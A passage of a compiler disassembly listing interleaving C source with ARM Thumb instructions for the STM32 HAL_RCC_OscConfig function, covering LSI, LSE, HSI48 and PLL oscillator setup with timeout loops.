 8003bd0:	2b00      	cmp	r3, #0
 8003bd2:	d01c      	beq.n	8003c0e <HAL_RCC_OscConfig+0x40e>
        MODIFY_REG(RCC->CSR, RCC_CSR_LSIPREDIV, RCC_OscInitStruct->LSIDiv);
      }
#endif /* RCC_CSR_LSIPREDIV */

      /* Enable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_ENABLE();
 8003bd4:	4b4b      	ldr	r3, [pc, #300]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003bd6:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003bda:	4a4a      	ldr	r2, [pc, #296]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003bdc:	f043 0301 	orr.w	r3, r3, #1
 8003be0:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003be4:	f7fd fa88 	bl	80010f8 <HAL_GetTick>
 8003be8:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is ready */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003bea:	e008      	b.n	8003bfe <HAL_RCC_OscConfig+0x3fe>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003bec:	f7fd fa84 	bl	80010f8 <HAL_GetTick>
 8003bf0:	4602      	mov	r2, r0
 8003bf2:	693b      	ldr	r3, [r7, #16]
 8003bf4:	1ad3      	subs	r3, r2, r3
 8003bf6:	2b02      	cmp	r3, #2
 8003bf8:	d901      	bls.n	8003bfe <HAL_RCC_OscConfig+0x3fe>
        {
          return HAL_TIMEOUT;
 8003bfa:	2303      	movs	r3, #3
 8003bfc:	e20c      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003bfe:	4b41      	ldr	r3, [pc, #260]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003c00:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003c04:	f003 0302 	and.w	r3, r3, #2
 8003c08:	2b00      	cmp	r3, #0
 8003c0a:	d0ef      	beq.n	8003bec <HAL_RCC_OscConfig+0x3ec>
 8003c0c:	e01b      	b.n	8003c46 <HAL_RCC_OscConfig+0x446>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_DISABLE();
 8003c0e:	4b3d      	ldr	r3, [pc, #244]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003c10:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003c14:	4a3b      	ldr	r2, [pc, #236]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003c16:	f023 0301 	bic.w	r3, r3, #1
 8003c1a:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003c1e:	f7fd fa6b 	bl	80010f8 <HAL_GetTick>
 8003c22:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is disabled */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003c24:	e008      	b.n	8003c38 <HAL_RCC_OscConfig+0x438>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003c26:	f7fd fa67 	bl	80010f8 <HAL_GetTick>
 8003c2a:	4602      	mov	r2, r0
 8003c2c:	693b      	ldr	r3, [r7, #16]
 8003c2e:	1ad3      	subs	r3, r2, r3
 8003c30:	2b02      	cmp	r3, #2
 8003c32:	d901      	bls.n	8003c38 <HAL_RCC_OscConfig+0x438>
        {
          return HAL_TIMEOUT;
 8003c34:	2303      	movs	r3, #3
 8003c36:	e1ef      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003c38:	4b32      	ldr	r3, [pc, #200]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003c3a:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003c3e:	f003 0302 	and.w	r3, r3, #2
 8003c42:	2b00      	cmp	r3, #0
 8003c44:	d1ef      	bne.n	8003c26 <HAL_RCC_OscConfig+0x426>
        }
      }
    }
  }
  /*------------------------------ LSE Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSE) == RCC_OSCILLATORTYPE_LSE)
 8003c46:	687b      	ldr	r3, [r7, #4]
 8003c48:	681b      	ldr	r3, [r3, #0]
 8003c4a:	f003 0304 	and.w	r3, r3, #4
 8003c4e:	2b00      	cmp	r3, #0
 8003c50:	f000 80a6 	beq.w	8003da0 <HAL_RCC_OscConfig+0x5a0>
  {
    FlagStatus       pwrclkchanged = RESET;
 8003c54:	2300      	movs	r3, #0
 8003c56:	77fb      	strb	r3, [r7, #31]
    /* Check the parameters */
    assert_param(IS_RCC_LSE(RCC_OscInitStruct->LSEState));

    /* Update LSE configuration in Backup Domain control register    */
    /* Requires to enable write access to Backup Domain of necessary */
    if(HAL_IS_BIT_CLR(RCC->APB1ENR1, RCC_APB1ENR1_PWREN))
 8003c58:	4b2a      	ldr	r3, [pc, #168]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003c5a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003c5c:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003c60:	2b00      	cmp	r3, #0
 8003c62:	d10d      	bne.n	8003c80 <HAL_RCC_OscConfig+0x480>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 8003c64:	4b27      	ldr	r3, [pc, #156]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003c66:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003c68:	4a26      	ldr	r2, [pc, #152]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003c6a:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8003c6e:	6593      	str	r3, [r2, #88]	; 0x58
 8003c70:	4b24      	ldr	r3, [pc, #144]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003c72:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003c74:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003c78:	60bb      	str	r3, [r7, #8]
 8003c7a:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 8003c7c:	2301      	movs	r3, #1
 8003c7e:	77fb      	strb	r3, [r7, #31]
    }

    if(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003c80:	4b21      	ldr	r3, [pc, #132]	; (8003d08 <HAL_RCC_OscConfig+0x508>)
 8003c82:	681b      	ldr	r3, [r3, #0]
 8003c84:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003c88:	2b00      	cmp	r3, #0
 8003c8a:	d118      	bne.n	8003cbe <HAL_RCC_OscConfig+0x4be>
    {
      /* Enable write access to Backup domain */
      SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8003c8c:	4b1e      	ldr	r3, [pc, #120]	; (8003d08 <HAL_RCC_OscConfig+0x508>)
 8003c8e:	681b      	ldr	r3, [r3, #0]
 8003c90:	4a1d      	ldr	r2, [pc, #116]	; (8003d08 <HAL_RCC_OscConfig+0x508>)
 8003c92:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003c96:	6013      	str	r3, [r2, #0]

      /* Wait for Backup domain Write protection disable */
      tickstart = HAL_GetTick();
 8003c98:	f7fd fa2e 	bl	80010f8 <HAL_GetTick>
 8003c9c:	6138      	str	r0, [r7, #16]

      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003c9e:	e008      	b.n	8003cb2 <HAL_RCC_OscConfig+0x4b2>
      {
        if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 8003ca0:	f7fd fa2a 	bl	80010f8 <HAL_GetTick>
 8003ca4:	4602      	mov	r2, r0
 8003ca6:	693b      	ldr	r3, [r7, #16]
 8003ca8:	1ad3      	subs	r3, r2, r3
 8003caa:	2b02      	cmp	r3, #2
 8003cac:	d901      	bls.n	8003cb2 <HAL_RCC_OscConfig+0x4b2>
        {
          return HAL_TIMEOUT;
 8003cae:	2303      	movs	r3, #3
 8003cb0:	e1b2      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003cb2:	4b15      	ldr	r3, [pc, #84]	; (8003d08 <HAL_RCC_OscConfig+0x508>)
 8003cb4:	681b      	ldr	r3, [r3, #0]
 8003cb6:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003cba:	2b00      	cmp	r3, #0
 8003cbc:	d0f0      	beq.n	8003ca0 <HAL_RCC_OscConfig+0x4a0>
    {
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEON);
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEBYP);
    }
#else
    __HAL_RCC_LSE_CONFIG(RCC_OscInitStruct->LSEState);
 8003cbe:	687b      	ldr	r3, [r7, #4]
 8003cc0:	689b      	ldr	r3, [r3, #8]
 8003cc2:	2b01      	cmp	r3, #1
 8003cc4:	d108      	bne.n	8003cd8 <HAL_RCC_OscConfig+0x4d8>
 8003cc6:	4b0f      	ldr	r3, [pc, #60]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003cc8:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003ccc:	4a0d      	ldr	r2, [pc, #52]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003cce:	f043 0301 	orr.w	r3, r3, #1
 8003cd2:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003cd6:	e029      	b.n	8003d2c <HAL_RCC_OscConfig+0x52c>
 8003cd8:	687b      	ldr	r3, [r7, #4]
 8003cda:	689b      	ldr	r3, [r3, #8]
 8003cdc:	2b05      	cmp	r3, #5
 8003cde:	d115      	bne.n	8003d0c <HAL_RCC_OscConfig+0x50c>
 8003ce0:	4b08      	ldr	r3, [pc, #32]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003ce2:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003ce6:	4a07      	ldr	r2, [pc, #28]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003ce8:	f043 0304 	orr.w	r3, r3, #4
 8003cec:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003cf0:	4b04      	ldr	r3, [pc, #16]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003cf2:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003cf6:	4a03      	ldr	r2, [pc, #12]	; (8003d04 <HAL_RCC_OscConfig+0x504>)
 8003cf8:	f043 0301 	orr.w	r3, r3, #1
 8003cfc:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003d00:	e014      	b.n	8003d2c <HAL_RCC_OscConfig+0x52c>
 8003d02:	bf00      	nop
 8003d04:	40021000 	.word	0x40021000
 8003d08:	40007000 	.word	0x40007000
 8003d0c:	4b9a      	ldr	r3, [pc, #616]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003d0e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003d12:	4a99      	ldr	r2, [pc, #612]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003d14:	f023 0301 	bic.w	r3, r3, #1
 8003d18:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003d1c:	4b96      	ldr	r3, [pc, #600]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003d1e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003d22:	4a95      	ldr	r2, [pc, #596]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003d24:	f023 0304 	bic.w	r3, r3, #4
 8003d28:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
#endif /* RCC_BDCR_LSESYSDIS */

    /* Check the LSE State */
    if(RCC_OscInitStruct->LSEState != RCC_LSE_OFF)
 8003d2c:	687b      	ldr	r3, [r7, #4]
 8003d2e:	689b      	ldr	r3, [r3, #8]
 8003d30:	2b00      	cmp	r3, #0
 8003d32:	d016      	beq.n	8003d62 <HAL_RCC_OscConfig+0x562>
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003d34:	f7fd f9e0 	bl	80010f8 <HAL_GetTick>
 8003d38:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is ready */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8003d3a:	e00a      	b.n	8003d52 <HAL_RCC_OscConfig+0x552>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8003d3c:	f7fd f9dc 	bl	80010f8 <HAL_GetTick>
 8003d40:	4602      	mov	r2, r0
 8003d42:	693b      	ldr	r3, [r7, #16]
 8003d44:	1ad3      	subs	r3, r2, r3
 8003d46:	f241 3288 	movw	r2, #5000	; 0x1388
 8003d4a:	4293      	cmp	r3, r2
 8003d4c:	d901      	bls.n	8003d52 <HAL_RCC_OscConfig+0x552>
        {
          return HAL_TIMEOUT;
 8003d4e:	2303      	movs	r3, #3
 8003d50:	e162      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8003d52:	4b89      	ldr	r3, [pc, #548]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003d54:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003d58:	f003 0302 	and.w	r3, r3, #2
 8003d5c:	2b00      	cmp	r3, #0
 8003d5e:	d0ed      	beq.n	8003d3c <HAL_RCC_OscConfig+0x53c>
 8003d60:	e015      	b.n	8003d8e <HAL_RCC_OscConfig+0x58e>
      }
    }
    else
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003d62:	f7fd f9c9 	bl	80010f8 <HAL_GetTick>
 8003d66:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is disabled */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8003d68:	e00a      	b.n	8003d80 <HAL_RCC_OscConfig+0x580>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8003d6a:	f7fd f9c5 	bl	80010f8 <HAL_GetTick>
 8003d6e:	4602      	mov	r2, r0
 8003d70:	693b      	ldr	r3, [r7, #16]
 8003d72:	1ad3      	subs	r3, r2, r3
 8003d74:	f241 3288 	movw	r2, #5000	; 0x1388
 8003d78:	4293      	cmp	r3, r2
 8003d7a:	d901      	bls.n	8003d80 <HAL_RCC_OscConfig+0x580>
        {
          return HAL_TIMEOUT;
 8003d7c:	2303      	movs	r3, #3
 8003d7e:	e14b      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8003d80:	4b7d      	ldr	r3, [pc, #500]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003d82:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003d86:	f003 0302 	and.w	r3, r3, #2
 8003d8a:	2b00      	cmp	r3, #0
 8003d8c:	d1ed      	bne.n	8003d6a <HAL_RCC_OscConfig+0x56a>
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSESYSDIS);
#endif /* RCC_BDCR_LSESYSDIS */
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 8003d8e:	7ffb      	ldrb	r3, [r7, #31]
 8003d90:	2b01      	cmp	r3, #1
 8003d92:	d105      	bne.n	8003da0 <HAL_RCC_OscConfig+0x5a0>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 8003d94:	4b78      	ldr	r3, [pc, #480]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003d96:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003d98:	4a77      	ldr	r2, [pc, #476]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003d9a:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8003d9e:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }
#if defined(RCC_HSI48_SUPPORT)
  /*------------------------------ HSI48 Configuration -----------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI48) == RCC_OSCILLATORTYPE_HSI48)
 8003da0:	687b      	ldr	r3, [r7, #4]
 8003da2:	681b      	ldr	r3, [r3, #0]
 8003da4:	f003 0320 	and.w	r3, r3, #32
 8003da8:	2b00      	cmp	r3, #0
 8003daa:	d03c      	beq.n	8003e26 <HAL_RCC_OscConfig+0x626>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSI48(RCC_OscInitStruct->HSI48State));

    /* Check the LSI State */
    if(RCC_OscInitStruct->HSI48State != RCC_HSI48_OFF)
 8003dac:	687b      	ldr	r3, [r7, #4]
 8003dae:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8003db0:	2b00      	cmp	r3, #0
 8003db2:	d01c      	beq.n	8003dee <HAL_RCC_OscConfig+0x5ee>
    {
      /* Enable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_ENABLE();
 8003db4:	4b70      	ldr	r3, [pc, #448]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003db6:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003dba:	4a6f      	ldr	r2, [pc, #444]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003dbc:	f043 0301 	orr.w	r3, r3, #1
 8003dc0:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003dc4:	f7fd f998 	bl	80010f8 <HAL_GetTick>
 8003dc8:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is ready */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 8003dca:	e008      	b.n	8003dde <HAL_RCC_OscConfig+0x5de>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 8003dcc:	f7fd f994 	bl	80010f8 <HAL_GetTick>
 8003dd0:	4602      	mov	r2, r0
 8003dd2:	693b      	ldr	r3, [r7, #16]
 8003dd4:	1ad3      	subs	r3, r2, r3
 8003dd6:	2b02      	cmp	r3, #2
 8003dd8:	d901      	bls.n	8003dde <HAL_RCC_OscConfig+0x5de>
        {
          return HAL_TIMEOUT;
 8003dda:	2303      	movs	r3, #3
 8003ddc:	e11c      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 8003dde:	4b66      	ldr	r3, [pc, #408]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003de0:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003de4:	f003 0302 	and.w	r3, r3, #2
 8003de8:	2b00      	cmp	r3, #0
 8003dea:	d0ef      	beq.n	8003dcc <HAL_RCC_OscConfig+0x5cc>
 8003dec:	e01b      	b.n	8003e26 <HAL_RCC_OscConfig+0x626>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_DISABLE();
 8003dee:	4b62      	ldr	r3, [pc, #392]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003df0:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003df4:	4a60      	ldr	r2, [pc, #384]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003df6:	f023 0301 	bic.w	r3, r3, #1
 8003dfa:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003dfe:	f7fd f97b 	bl	80010f8 <HAL_GetTick>
 8003e02:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is disabled */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 8003e04:	e008      	b.n	8003e18 <HAL_RCC_OscConfig+0x618>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 8003e06:	f7fd f977 	bl	80010f8 <HAL_GetTick>
 8003e0a:	4602      	mov	r2, r0
 8003e0c:	693b      	ldr	r3, [r7, #16]
 8003e0e:	1ad3      	subs	r3, r2, r3
 8003e10:	2b02      	cmp	r3, #2
 8003e12:	d901      	bls.n	8003e18 <HAL_RCC_OscConfig+0x618>
        {
          return HAL_TIMEOUT;
 8003e14:	2303      	movs	r3, #3
 8003e16:	e0ff      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 8003e18:	4b57      	ldr	r3, [pc, #348]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003e1a:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003e1e:	f003 0302 	and.w	r3, r3, #2
 8003e22:	2b00      	cmp	r3, #0
 8003e24:	d1ef      	bne.n	8003e06 <HAL_RCC_OscConfig+0x606>
#endif /* RCC_HSI48_SUPPORT */
  /*-------------------------------- PLL Configuration -----------------------*/
  /* Check the parameters */
  assert_param(IS_RCC_PLL(RCC_OscInitStruct->PLL.PLLState));

  if(RCC_OscInitStruct->PLL.PLLState != RCC_PLL_NONE)
 8003e26:	687b      	ldr	r3, [r7, #4]
 8003e28:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8003e2a:	2b00      	cmp	r3, #0
 8003e2c:	f000 80f3 	beq.w	8004016 <HAL_RCC_OscConfig+0x816>
  {
    /* PLL On ? */
    if(RCC_OscInitStruct->PLL.PLLState == RCC_PLL_ON)
 8003e30:	687b      	ldr	r3, [r7, #4]
 8003e32:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8003e34:	2b02      	cmp	r3, #2
 8003e36:	f040 80c9 	bne.w	8003fcc <HAL_RCC_OscConfig+0x7cc>
#endif /* RCC_PLLP_SUPPORT */
      assert_param(IS_RCC_PLLQ_VALUE(RCC_OscInitStruct->PLL.PLLQ));
      assert_param(IS_RCC_PLLR_VALUE(RCC_OscInitStruct->PLL.PLLR));

      /* Do nothing if PLL configuration is the unchanged */
      pll_config = RCC->PLLCFGR;
 8003e3a:	4b4f      	ldr	r3, [pc, #316]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003e3c:	68db      	ldr	r3, [r3, #12]
 8003e3e:	617b      	str	r3, [r7, #20]
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 8003e40:	697b      	ldr	r3, [r7, #20]
 8003e42:	f003 0203 	and.w	r2, r3, #3
 8003e46:	687b      	ldr	r3, [r7, #4]
 8003e48:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8003e4a:	429a      	cmp	r2, r3
 8003e4c:	d12c      	bne.n	8003ea8 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 8003e4e:	697b      	ldr	r3, [r7, #20]
 8003e50:	f003 0270 	and.w	r2, r3, #112	; 0x70
 8003e54:	687b      	ldr	r3, [r7, #4]
 8003e56:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8003e58:	3b01      	subs	r3, #1
 8003e5a:	011b      	lsls	r3, r3, #4
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 8003e5c:	429a      	cmp	r2, r3
 8003e5e:	d123      	bne.n	8003ea8 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 8003e60:	697b      	ldr	r3, [r7, #20]
 8003e62:	f403 42fe 	and.w	r2, r3, #32512	; 0x7f00
 8003e66:	687b      	ldr	r3, [r7, #4]
 8003e68:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8003e6a:	021b      	lsls	r3, r3, #8
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 8003e6c:	429a      	cmp	r2, r3
 8003e6e:	d11b      	bne.n	8003ea8 <HAL_RCC_OscConfig+0x6a8>
#if defined(RCC_PLLP_SUPPORT)
#if defined(RCC_PLLP_DIV_2_31_SUPPORT)
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 8003e70:	697b      	ldr	r3, [r7, #20]
 8003e72:	f003 4278 	and.w	r2, r3, #4160749568	; 0xf8000000
 8003e76:	687b      	ldr	r3, [r7, #4]
 8003e78:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 8003e7a:	06db      	lsls	r3, r3, #27
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 8003e7c:	429a      	cmp	r2, r3
 8003e7e:	d113      	bne.n	8003ea8 <HAL_RCC_OscConfig+0x6a8>
#else
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLP)    != ((RCC_OscInitStruct->PLL.PLLP == RCC_PLLP_DIV7) ? 0U : 1U)) ||
#endif
#endif
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 8003e80:	697b      	ldr	r3, [r7, #20]
 8003e82:	f403 02c0 	and.w	r2, r3, #6291456	; 0x600000
 8003e86:	687b      	ldr	r3, [r7, #4]
 8003e88:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8003e8a:	085b      	lsrs	r3, r3, #1
 8003e8c:	3b01      	subs	r3, #1
 8003e8e:	055b      	lsls	r3, r3, #21
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 8003e90:	429a      	cmp	r2, r3
 8003e92:	d109      	bne.n	8003ea8 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLR)    != ((((RCC_OscInitStruct->PLL.PLLR) >> 1U) - 1U) << RCC_PLLCFGR_PLLR_Pos)))
 8003e94:	697b      	ldr	r3, [r7, #20]
 8003e96:	f003 62c0 	and.w	r2, r3, #100663296	; 0x6000000
 8003e9a:	687b      	ldr	r3, [r7, #4]
 8003e9c:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8003e9e:	085b      	lsrs	r3, r3, #1
 8003ea0:	3b01      	subs	r3, #1
 8003ea2:	065b      	lsls	r3, r3, #25
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 8003ea4:	429a      	cmp	r2, r3
 8003ea6:	d06b      	beq.n	8003f80 <HAL_RCC_OscConfig+0x780>
      {
        /* Check if the PLL is used as system clock or not */
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 8003ea8:	69bb      	ldr	r3, [r7, #24]
 8003eaa:	2b0c      	cmp	r3, #12
 8003eac:	d062      	beq.n	8003f74 <HAL_RCC_OscConfig+0x774>
        {
#if defined(RCC_PLLSAI1_SUPPORT) || defined(RCC_PLLSAI2_SUPPORT)
          /* Check if main PLL can be updated */
          /* Not possible if the source is shared by other enabled PLLSAIx */
          if((READ_BIT(RCC->CR, RCC_CR_PLLSAI1ON) != 0U)
 8003eae:	4b32      	ldr	r3, [pc, #200]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003eb0:	681b      	ldr	r3, [r3, #0]
 8003eb2:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 8003eb6:	2b00      	cmp	r3, #0
 8003eb8:	d001      	beq.n	8003ebe <HAL_RCC_OscConfig+0x6be>
#if defined(RCC_PLLSAI2_SUPPORT)
             || (READ_BIT(RCC->CR, RCC_CR_PLLSAI2ON) != 0U)
#endif
            )
          {
            return HAL_ERROR;
 8003eba:	2301      	movs	r3, #1
 8003ebc:	e0ac      	b.n	8004018 <HAL_RCC_OscConfig+0x818>
          }
          else
#endif /* RCC_PLLSAI1_SUPPORT || RCC_PLLSAI2_SUPPORT */
          {
            /* Disable the main PLL. */
            __HAL_RCC_PLL_DISABLE();
 8003ebe:	4b2e      	ldr	r3, [pc, #184]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003ec0:	681b      	ldr	r3, [r3, #0]
 8003ec2:	4a2d      	ldr	r2, [pc, #180]	; (8003f78 <HAL_RCC_OscConfig+0x778>)
 8003ec4:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 8003ec8:	6013      	str	r3, [r2, #0]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 8003eca:	f7fd f915 	bl	80010f8 <HAL_GetTick>
 8003ece:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8003ed0:	e008      	b.n	8003ee4 <HAL_RCC_OscConfig+0x6e4>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
